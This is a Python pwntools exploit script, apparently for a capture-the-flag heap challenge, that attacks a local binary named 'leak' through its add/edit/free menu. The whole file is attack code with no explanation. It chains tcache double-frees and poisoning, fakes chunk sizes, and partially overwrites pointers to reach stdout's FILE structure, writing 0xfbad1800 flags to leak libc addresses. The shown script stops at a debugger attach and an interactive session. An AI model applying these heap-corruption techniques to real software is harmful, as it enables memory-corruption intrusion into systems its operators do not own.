from pwn import * 
from LibcSearcher import * 
# context.log_level = 'debug' 
p=process('./leak')
elf=ELF('./leak')
def add(index,size):
    p.recvuntil(b'6. exit\n')
    p.recvuntil(b'Your choice: ')
    p.sendline(b'1')
    p.recvuntil(b'Index: ')
    p.sendline(str(index).encode())
    p.recvuntil(b'Size: ')
    p.sendline(str(size).encode())
def edit(index,content):
    p.recvuntil(b'6. exit\n')
    p.recvuntil(b'Your choice: ')
    p.sendline(b'2')
    p.recvuntil(b'Index: ')
    p.sendline(str(index).encode())
    p.recvuntil(b'Content: ')
    p.send(content)
def free(index):
    p.recvuntil(b'6. exit\n')
    p.recvuntil(b'Your choice: ')
    p.sendline(b'3')
    p.recvuntil(b'Index: ')
    p.sendline(str(index).encode())
p.recvuntil(b'set up.\n')
# p.recv()
# pause()
# for i in range(7):
#     allocate(i,240)
add(0,0x30)
add(1,0x30)
add(4,0x20)
add(2,0x30)
for  i in range(3):
    free(0)
    edit(0,p64(0))
    free(1)
    edit(1,p64(0))

free(0)
edit(0,p64(0))
#free(1)
#free(2)

add(3,0x90)
add(5,0x20)
add(8,0xd0)
add(9,0x50)

free(4)
free(5)
edit(5,b'\x40')

add(6,0x20)
add(7,0x20)
edit(7,p64(0x6161616161616161)+p64(0x41))
free(1)
free(2)
edit(7,p64(0x65656565)+p64(0x61))


free(9)
free(2)

edit(7,p64(0x65656565)+p64(0xe1))
for i in range(3):
    free(8)
    edit(8,p64(0))
    free(2)
    edit(2,p64(0))

free(8)
edit(8,p64(0))
free(2)
edit(7,p64(0x65656565)+p64(0x41)+b'\x60\xc7')

add(11,0x50)
add(10,0x50)
edit(10,p64(0xfbad1800)+p64(0)*4+p64(0x5fffffffffff))
gdb.attach(p)
edit(2,b'\x68\xc7')
# pause()
add(12,0x30)
# pause()
add(13,0x30)
# pause()


p.interactive()